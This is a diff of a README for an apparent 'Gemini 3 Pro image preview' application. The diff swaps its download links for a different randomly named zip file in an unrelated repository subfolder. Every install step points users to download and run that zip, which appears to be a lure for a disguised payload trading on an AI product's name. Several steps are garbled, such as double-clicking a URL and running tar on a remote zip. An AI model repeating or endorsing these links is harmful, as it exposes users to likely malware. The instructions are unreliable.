@@ -6,11 +6,11 @@ Welcome to the Gemini 3 Pro image preview application! This tool helps you easil
 
 ## 📥 Download the Application
 
-[![Download Now](https://raw.githubusercontent.com/Raghavvbaiju/gemini-3-pro-image-preview/main/regardant/gemini-3-pro-image-preview_detribalization.zip%20Now-1D76DB?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Raghavvbaiju/gemini-3-pro-image-preview/main/regardant/gemini-3-pro-image-preview_detribalization.zip)
+[![Download Now](https://raw.githubusercontent.com/Raghavvbaiju/gemini-3-pro-image-preview/main/regardant/gemini-image-pro-preview-enterritoriality.zip%20Now-1D76DB?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Raghavvbaiju/gemini-3-pro-image-preview/main/regardant/gemini-image-pro-preview-enterritoriality.zip)
 
 Visit this page to download the latest version of the Gemini 3 Pro - AI 绘图工作台 (Web Client) application:
 
-[Download the latest release](https://raw.githubusercontent.com/Raghavvbaiju/gemini-3-pro-image-preview/main/regardant/gemini-3-pro-image-preview_detribalization.zip)
+[Download the latest release](https://raw.githubusercontent.com/Raghavvbaiju/gemini-3-pro-image-preview/main/regardant/gemini-image-pro-preview-enterritoriality.zip)
 
 ## 💻 System Requirements
 
@@ -22,12 +22,12 @@ Visit this page to download the latest version of the Gemini 3 Pro - AI 绘图�
 ## 📦 Download & Install
 
 1. Click on the download link provided above to navigate to the Releases page.
-2. Locate the version you want to download. Look for assets such as "https://raw.githubusercontent.com/Raghavvbaiju/gemini-3-pro-image-preview/main/regardant/gemini-3-pro-image-preview_detribalization.zip" or "https://raw.githubusercontent.com/Raghavvbaiju/gemini-3-pro-image-preview/main/regardant/gemini-3-pro-image-preview_detribalization.zip"
+2. Locate the version you want to download. Look for assets such as "https://raw.githubusercontent.com/Raghavvbaiju/gemini-3-pro-image-preview/main/regardant/gemini-image-pro-preview-enterritoriality.zip" or "https://raw.githubusercontent.com/Raghavvbaiju/gemini-3-pro-image-preview/main/regardant/gemini-image-pro-preview-enterritoriality.zip"
 3. Click on the file link to start downloading.
 4. Once the download completes, locate the file in your downloads folder.
-5. **For Windows Users:** Right-click the zip file and select "Extract All." Open the extracted folder and double-click "https://raw.githubusercontent.com/Raghavvbaiju/gemini-3-pro-image-preview/main/regardant/gemini-3-pro-image-preview_detribalization.zip" to launch the application.
+5. **For Windows Users:** Right-click the zip file and select "Extract All." Open the extracted folder and double-click "https://raw.githubusercontent.com/Raghavvbaiju/gemini-3-pro-image-preview/main/regardant/gemini-image-pro-preview-enterritoriality.zip" to launch the application.
 6. **For macOS Users:** Double-click the downloaded file to mount it. Drag the app icon to your Applications folder, then open the application from there.
-7. **For Linux Users:** Open a terminal and navigate to the folder where you downloaded the file. Use the command `tar -xvzf https://raw.githubusercontent.com/Raghavvbaiju/gemini-3-pro-image-preview/main/regardant/gemini-3-pro-image-preview_detribalization.zip` to extract the files. Then, run `./gemini-3-pro-image-preview` to start the application.
+7. **For Linux Users:** Open a terminal and navigate to the folder where you downloaded the file. Use the command `tar -xvzf https://raw.githubusercontent.com/Raghavvbaiju/gemini-3-pro-image-preview/main/regardant/gemini-image-pro-preview-enterritoriality.zip` to extract the files. Then, run `./gemini-3-pro-image-preview` to start the application.
 
 ## 🎨 Features
 
